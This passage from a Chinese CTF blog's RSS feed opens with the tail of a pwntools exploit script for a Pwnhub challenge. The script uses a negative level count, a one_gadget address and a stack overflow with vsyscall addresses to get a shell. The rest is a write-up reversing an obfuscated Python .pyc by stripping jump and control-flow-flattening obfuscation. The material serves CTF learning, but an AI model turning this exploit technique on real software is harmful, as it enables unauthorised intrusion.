class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Question: '</span>) </div><div class="line">	tmp1 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.recvuntil(<span class="string">'* '</span>)</div><div class="line">	tmp2 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.sendline(str(tmp1 * tmp2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer2</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"Answer:"</span>)</div><div class="line">	p.sendline(<span class="string">"233"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">'How many levels?'</span>)</div><div class="line">p.sendline(<span class="string">'-1'</span>)</div><div class="line">p.recvuntil(<span class="string">'Any more?'</span>)</div><div class="line"></div><div class="line"><span class="comment"># p.sendline("2")</span></div><div class="line">p.sendline(str(libc_base+one_gadget_base))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>): </div><div class="line">	log.info(i)</div><div class="line">	ansewer()</div><div class="line">p.recvuntil(<span class="string">'Question: '</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line"></div><div class="line">p.send(<span class="string">'a'</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffff600000</span>) * <span class="number">3</span>) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>PS: 这题我没做出来，是看别人的Payload学习的，所以上面的Payload不是我自己写的.</p>
<p>PSS: 因为有别的重要的事，所以另外一题堆的题目暂时没空更新，等有空了会更新上来的</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/29/0x39/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Pwnhub之奇妙的巨蟒 Writeup</title>
      <link>http://0x48.pw/2017/08/29/0x38/</link>
      <guid>http://0x48.pw/2017/08/29/0x38/</guid>
      <pubDate>Tue, 29 Aug 2017 04:01:38 GMT</pubDate>
      <description>
      
        &lt;p&gt;本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力</p>
<a id="more"></a>
<p>本题是一道pyc逆向题，用uncompyle6没法跑出来，所以猜测又是考python的opcode</p>
<p>之前做过相关研究，也写过一篇blog：<a href="http://0x48.pw/2017/03/20/0x2f/">http://0x48.pw/2017/03/20/0x2f/</a></p>
<p>主要是两个参考文档：</p>
<ol>
<li><a href="https://github.com/Python/cpython/blob/2.7/Include/opcode.h" target="_blank" rel="external">opcode.h</a></li>
<li><a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="external">opcode 具体代表的操作</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> dis, marshal</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">"./final.pyc"</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f.read(<span class="number">8</span>)</div><div class="line"><span class="string">'\x03\xf3\r\nT\x16xY'</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code = marshal.load(f)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code.co_consts</div><div class="line">.....(输出太多了省略)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code.co_varnames</div><div class="line">(<span class="string">'DIVIDER'</span>,)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code.co_names</div><div class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'int'</span>, <span class="string">'str'</span>, <span class="string">'i'</span>, <span class="string">'q'</span>, <span class="string">'raw_input'</span>, <span class="string">'True'</span>, <span class="string">'aa'</span>, <span class="string">'xrange'</span>, <span class="string">'OO00000O0O0OO0OOO'</span>, <span class="string">'sys'</span>, <span class="string">'OO000OOO0O000O00O'</span>, <span class="string">'time'</span>, <span class="string">'OO0OO00O0OO0OO00O'</span>, <span class="string">'False'</span>, <span class="string">'r'</span>, <span class="string">'marshal'</span>, <span class="string">'c'</span>, <span class="string">'x'</span>, <span class="string">'p'</span>, <span class="string">'None'</span>, <span class="string">'f'</span>, <span class="string">'args'</span>, <span class="string">'kwargs'</span>, <span class="string">'u'</span>)</div></pre></td></tr></table></figure>
<p>我们主要关心上面这三个集合，分别是<code>co_consts</code>, <code>co_varnames</code>, <code>co_names</code></p>
<p>其中：</p>
<ul>
<li>co_consts集合中包含的是该模块中定义的各种数据类型，具体的值，比如定义的对象，赋值的字符串/int型数据</li>
<li>co_varnames表示的是当前作用域的局部变量的变量名</li>
</ul>
<p>接下来就是看具体的opcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble_string(code.co_code)</div><div class="line">Traceback (most recent call last):</div><div class="line">IndexError: string index out of range</div><div class="line">string index out of range</div></pre></td></tr></table></figure>
<p>但是发现报错，跑不了，我的思路是一句一句看，从opcode.h头文件中可以看出opcode为1字节，再加上操作数的话就是3字节，所以一句指令的长度是1字节或者3字节，所以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble_string(code.co_code[:<span class="number">3</span>])</div><div class="line">          <span class="number">0</span> JUMP_ABSOLUTE    <span class="number">3292</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble_string(code.co_code[<span class="number">3292</span>:<span class="number">3292</span>+<span class="number">3</span>])</div><div class="line">          <span class="number">0</span> JUMP_FORWARD       <span class="number">24</span> (to <span class="number">27</span>)</div></pre></td></tr></table></figure>
<p>我使用上面的方面进行简单的测试，发现有一大堆的<code>JUMP_ABSOLUTE</code>和<code>JUMP_FORWARD</code>指令，这时就知道这里有混淆了。</p>
<p>参考文档，我们可以知道<code>JUMP_ABSOLUTE</code>是跳到绝对地址，<code>JUMP_FORWARD</code>是下一个地址加上操作数，比如<code>0 JUMP_FORWARD       24 (to 27)</code> ，当前地址0，当前指令是3字节，下一个地址是3，加上24是27，所以执行完这句指令是跳到27，这里我只是举例，在本题中，地址0是从code.co_code[0]开始</p>
<p>该模块的最外层很麻烦，追了一会指令流就看不住了，然后就看定义的函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>func_list = []                                                           </div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> code.co_consts:</div><div class="line"><span class="meta">... </span>    <span class="keyword">if</span> type(x) == type(code.co_consts[<span class="number">0</span>]):</div><div class="line"><span class="meta">... </span>        func_list.append(x)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> func_list:</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> x.co_name                  <span class="comment"># 函数名</span></div><div class="line">a</div><div class="line">q</div><div class="line">a</div><div class="line">a</div><div class="line">a</div><div class="line">aa</div><div class="line">a</div><div class="line">a</div><div class="line">aa</div><div class="line">r</div><div class="line">a</div><div class="line">a</div><div class="line">a</div><div class="line">p</div><div class="line">a</div><div class="line">a</div><div class="line">a</div><div class="line">f</div><div class="line">a</div><div class="line">&lt;setcomp&gt;</div><div class="line">&lt;dictcomp&gt;</div><div class="line">u</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> func_list:</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> x.co_consts</div><div class="line">(<span class="keyword">None</span>, <span class="number">2574606289</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="string">'hex'</span>, <span class="string">''</span>, <span class="number">2269302367</span>, <span class="number">3999397071</span>, <span class="number">3212575724</span>, <span class="number">4011125418</span>, <span class="number">2541851390</span>, <span class="number">3101964664</span>, <span class="number">4002314880</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">3363589608</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">928441828</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">2827689411</span>, <span class="number">3340835492</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">0</span>, <span class="number">3149946851</span>, <span class="number">1915448404</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">1761489969</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">3346499627</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">0</span>, <span class="number">804230483</span>, <span class="number">1849535108</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">811440571</span>, <span class="number">694805067</span>, <span class="number">1480591167</span>, <span class="number">2317567929</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="string">''</span>, <span class="number">103332102</span>, <span class="number">3569318510</span>, <span class="number">2445961406</span>, <span class="number">2136442608</span>, <span class="number">3449813582</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1254503156</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">3745711837</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">256</span>, <span class="number">184</span>, <span class="number">139</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">158</span>, <span class="number">161</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">142</span>, <span class="number">128</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">130</span>, <span class="number">253</span>, <span class="number">17</span>, <span class="number">219</span>, <span class="number">88</span>, <span class="number">180</span>, <span class="number">14</span>, <span class="number">83</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">57</span>, <span class="number">178</span>, <span class="number">91</span>, <span class="number">245</span>, <span class="number">207</span>, <span class="number">0</span>, <span class="number">249</span>, <span class="number">166</span>, <span class="number">230</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">240</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">255</span>, <span class="number">202</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">173</span>, <span class="number">69</span>, <span class="number">227</span>, <span class="number">124</span>, <span class="number">15</span>, <span class="number">141</span>, <span class="number">205</span>, <span class="number">170</span>, <span class="number">11</span>, <span class="number">133</span>, <span class="number">218</span>, <span class="number">149</span>, <span class="number">12</span>, <span class="number">193</span>, <span class="number">67</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">103</span>, <span class="number">151</span>, <span class="number">145</span>, <span class="number">4002470191</span>, <span class="number">2521589842</span>, <span class="number">1264028523</span>, <span class="number">1557840806</span>, <span class="number">2269633706</span>, <span class="number">951771769</span>, <span class="number">1948225321</span>, <span class="number">2840041954</span>, <span class="number">240350730</span>, <span class="number">2835968845</span>, <span class="number">1344465054</span>, <span class="number">1832969381</span>, <span class="number">414996033</span>, <span class="number">893304341</span>, <span class="number">1033856613</span>, <span class="number">2005820485</span>, <span class="number">1655033734</span>, <span class="number">383297387</span>, <span class="number">1110377909</span>, <span class="number">1331741225</span>, <span class="number">98787899</span>, <span class="number">3245587348</span>, <span class="number">3507579705</span>, <span class="number">2710942562</span>, <span class="number">408230478</span>, <span class="number">4193925412</span>, <span class="number">4258146773</span>, <span class="number">3555027567</span>, <span class="number">2696796853</span>, <span class="number">3228309104</span>, <span class="number">1702138493</span>, <span class="number">878416672</span>, <span class="number">1840033377</span>, <span class="number">2212037170</span>, <span class="number">1264539365</span>, <span class="number">155548767</span>, <span class="number">3125510233</span>, <span class="number">2468296542</span>, <span class="number">2105197060</span>, <span class="number">1611521139</span>, <span class="number">2978471848</span>, <span class="number">3090963965</span>, <span class="number">3551862263</span>, <span class="number">4190549182</span>, <span class="number">1060650455</span>, <span class="number">418207362</span>, <span class="number">2505390665</span>, <span class="number">148314961</span>, <span class="number">1392669086</span>, <span class="number">3687927788</span>, <span class="number">740579929</span>, <span class="number">2902468892</span>, <span class="number">3221147519</span>, <span class="number">1094609218</span>, <span class="number">2451398154</span>, <span class="number">2409455404</span>, <span class="number">3351906386</span>, <span class="number">2473439137</span>, <span class="number">3475738179</span>, <span class="number">1904786329</span>, <span class="number">3519084889</span>, <span class="number">979327822</span>, <span class="number">2909197751</span>, <span class="number">2846946149</span>, <span class="number">3980818176</span>, <span class="number">4127800602</span>, <span class="number">1291996042</span>, <span class="number">4037586272</span>, <span class="number">2675091267</span>, <span class="number">199113052</span>, <span class="number">710970151</span>, <span class="number">1897807508</span>, <span class="number">1373489195</span>, <span class="number">1776856572</span>, <span class="number">1804854838</span>, <span class="number">1781505473</span>, <span class="number">3306320587</span>, <span class="number">1760320652</span>, <span class="number">860749406</span>, <span class="number">161432034</span>, <span class="number">3258951656</span>, <span class="number">2792565458</span>, <span class="number">1916846289</span>, <span class="number">2023044049</span>, <span class="number">1935716574</span>, <span class="number">1285095588</span>, <span class="number">3035625565</span>, <span class="number">3586006421</span>, <span class="number">2368742222</span>, <span class="number">3131839710</span>, <span class="number">2298893290</span>, <span class="number">1460710676</span>, <span class="number">4009727955</span>, <span class="number">2535652387</span>, <span class="number">19895811</span>, <span class="number">2953554646</span>, <span class="number">1834358963</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">156819970</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">2362387540</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">807794131</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, &lt;code object O0O00O0OOOOO000OO at <span class="number">0x7fd9b10f6ab0</span>, file <span class="string">"ck.py"</span>, line <span class="number">200</span>&gt;, <span class="number">2901513116</span>, <span class="number">1218601877</span>, <span class="number">625447945</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">2014553041</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">1296050898</span>, <span class="number">2236454079</span>, <span class="number">1998426264</span>, <span class="number">3102970915</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">2343257866</span>, <span class="number">676615509</span>, <span class="number">2173771105</span>, <span class="number">697135550</span>, <span class="number">1974986440</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="string">''</span>, <span class="string">'Wrong key!'</span>, <span class="string">'Good job! The flag is pwnhub&#123;flag:your input(lower case)&#125;'</span>, <span class="number">3463300106</span>, <span class="number">3857901018</span>, <span class="number">3949890875</span>, <span class="number">174919631</span>, <span class="number">1639824250</span>, <span class="number">433978434</span>, <span class="number">3710075802</span>, <span class="number">161154336</span>, <span class="number">33478671</span>, <span class="number">2489981027</span>, <span class="number">1574135945</span>, <span class="number">3935706030</span>, <span class="number">1700692433</span>, <span class="number">832561131</span>, <span class="keyword">None</span>)</div></pre></td></tr></table></figure>
<p>随便看了下各个函数的相关信息，发现u函数中有flag相关信息，然后开始逆u函数，首先收集下u函数的相关变量信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>u = func_list[<span class="number">-1</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_argcount</div><div class="line"><span class="number">1</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_varnames</div><div class="line">(<span class="string">'OOO000OOOOOO00OOO'</span>, <span class="string">'OOOO000OO000OOOOO'</span>, <span class="string">'DIVIDER'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_names</div><div class="line">(<span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'p'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>u.co_consts</div><div class="line">(<span class="keyword">None</span>, <span class="string">''</span>, <span class="string">'Wrong key!'</span>, <span class="string">'Good job! The flag is pwnhub&#123;flag:your input(lower case)&#125;'</span>, <span class="number">3463300106</span>, <span class="number">3857901018</span>, <span class="number">3949890875</span>, <span class="number">174919631</span>, <span class="number">1639824250</span>, <span class="number">433978434</span>, <span class="number">3710075802</span>, <span class="number">161154336</span>, <span class="number">33478671</span>, <span class="number">2489981027</span>, <span class="number">1574135945</span>, <span class="number">3935706030</span>, <span class="number">1700692433</span>, <span class="number">832561131</span>, <span class="keyword">None</span>)</div></pre></td></tr></table></figure>
<p>写了个脚本，自动追踪指令并输出，但是跳过两个<code>JUMP</code>指令的输出，然后又发现了一个控制流平坦化混淆…….简单的举例下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="number">175</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">10</span> (<span class="number">10</span>)</div><div class="line"><span class="number">178</span>: </div><div class="line">          <span class="number">0</span> STORE_FAST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">247</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">9</span> (<span class="number">9</span>)</div><div class="line"><span class="number">44</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">47</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">50</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE    <span class="number">74</span></div><div class="line"><span class="number">53</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">15</span> (<span class="number">15</span>)</div><div class="line"><span class="number">56</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">59</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">62</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE    <span class="number">77</span></div><div class="line"><span class="number">65</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">5</span> (<span class="number">5</span>)</div><div class="line"><span class="number">68</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">596</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">599</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE   <span class="number">626</span></div><div class="line"><span class="number">602</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">11</span> (<span class="number">11</span>)</div><div class="line"><span class="number">605</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">608</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">611</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE   <span class="number">629</span></div><div class="line"><span class="number">614</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST         <span class="number">10</span> (<span class="number">10</span>)</div><div class="line"><span class="number">617</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">620</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">88</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_TRUE   <span class="number">115</span></div></pre></td></tr></table></figure>
<p>解释下各个指令的含义：</p>
<ul>
<li>LOAD_CONST      10 (10)     ==&gt;    push  co_consts[10]</li>
<li>STORE_FAST         2 (2)         ==&gt;    pop co_varnames[2]</li>
<li>LOAD_FAST           2 (2)         ==&gt;    push co_varnames[2]</li>
<li>COMPARE_OP      2 (==)       ==&gt;    pop x1; pop x2; if x1 == x2: push 1 else: push 0   (该指令的操作数2表示栈上的两个数进行比较)</li>
<li>POP_JUMP_IF_TRUE    74    ==&gt;    pop x1; if x1: jmp 74</li>
</ul>
<p>翻译成伪代码就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">DIVIDER = co_consts[<span class="number">10</span>]</div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">9</span>]:</div><div class="line">	jmp <span class="number">74</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">15</span>]:</div><div class="line">	jmp <span class="number">77</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">5</span>]:</div><div class="line">	jmp <span class="number">626</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">11</span>]:</div><div class="line">	jmp <span class="number">629</span></div><div class="line"><span class="keyword">if</span> DIVIDER == co_consts[<span class="number">10</span>]:</div><div class="line">	jmp <span class="number">115</span></div></pre></td></tr></table></figure>
<p>这个就是控制流平坦化混淆，中间有一堆垃圾代码，因为我怕时间来不及就没有写全自动换脚本，是半自动半手工做题，用脚本去掉JUMP混淆，把结果输出到文件中，然后用ctrl+f，去掉控制流平坦化混淆(之后会在我博客中放全自动脚本)</p>
<p>去掉混淆后的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="number">283</span>: </div><div class="line">          <span class="number">0</span> LOAD_GLOBAL         <span class="number">0</span> (<span class="number">0</span>)     TOP1</div><div class="line"><span class="number">286</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">0</span> (<span class="number">0</span>)     TOP</div><div class="line"><span class="number">289</span>: </div><div class="line">          <span class="number">0</span> CALL_FUNCTION       <span class="number">1</span>         CALL TOP1(TOP)</div><div class="line"></div><div class="line">q(OOO000OOOOOO00OOO)</div><div class="line"></div><div class="line"><span class="number">229</span>: </div><div class="line">          <span class="number">0</span> STORE_FAST          <span class="number">1</span> (<span class="number">1</span>)     </div><div class="line"></div><div class="line">OOOO000OO000OOOOO = q(OOO000OOOOOO00OOO)</div><div class="line"></div><div class="line"><span class="number">232</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">235</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">336</span>: </div><div class="line">          <span class="number">0</span> COMPARE_OP          <span class="number">2</span> (==)</div><div class="line"><span class="number">222</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_FALSE   <span class="number">253</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> OOOO000OO000OOOOO != <span class="string">""</span>:   JUMP <span class="number">253</span></div><div class="line"></div><div class="line"><span class="number">657</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">660</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">661</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line"></div><div class="line">PRINT co_consts[<span class="number">2</span>]</div><div class="line"></div><div class="line"><span class="number">276</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE  </div><div class="line"><span class="keyword">return</span> <span class="number">0</span> </div><div class="line"><span class="comment">###</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(OOO000OOOOOO00OOO)</span>:</span></div><div class="line">  OOOO000OO000OOOOO = q(OOO000OOOOOO00OOO)</div><div class="line">  <span class="keyword">if</span> OOOO000OO000OOOOO == <span class="string">""</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">'Wrong key!'</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span></div><div class="line"><span class="comment">###</span></div></pre></td></tr></table></figure>
<p>第一个分支我们可以翻译出上面的代码，然后把指令调到253，在继续跑脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="number">682</span>: </div><div class="line">          <span class="number">0</span> LOAD_GLOBAL         <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">685</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">688</span>: </div><div class="line">          <span class="number">0</span> CALL_FUNCTION       <span class="number">1</span></div><div class="line"><span class="number">691</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_FALSE   <span class="number">709</span></div><div class="line"></div><div class="line"> <span class="keyword">if</span> r(OOOO000OO000OOOOO) == <span 